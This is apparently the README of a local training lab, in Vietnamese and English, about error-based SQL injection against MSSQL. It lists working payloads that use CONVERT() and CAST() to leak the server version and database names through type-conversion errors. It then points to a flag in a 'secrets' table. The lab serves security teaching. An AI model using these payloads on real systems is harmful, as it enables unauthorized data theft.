# SQLi-012: MSSQL CONVERT/CAST Error-based

## 🎯 Mục Tiêu
Sử dụng **CONVERT()** hoặc **CAST()** để extract data trong MSSQL thông qua type conversion errors.

## 📝 Kịch Bản
Corporate directory search với MSSQL backend.

**URL:** `http://localhost:5012/search?q=john`

## 🎓 Kiến Thức
```sql
-- CONVERT extraction
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysdatabases))--

-- CAST extraction
' AND 1=CAST(@@version AS int)--
```

Error: `Conversion failed when converting the nvarchar value 'XXX' to data type int.`

## 🚀 Chạy Lab
```bash
docker-compose up -d
# http://localhost:5012
```

## 🏁 Flag
Extract từ bảng `secrets`.
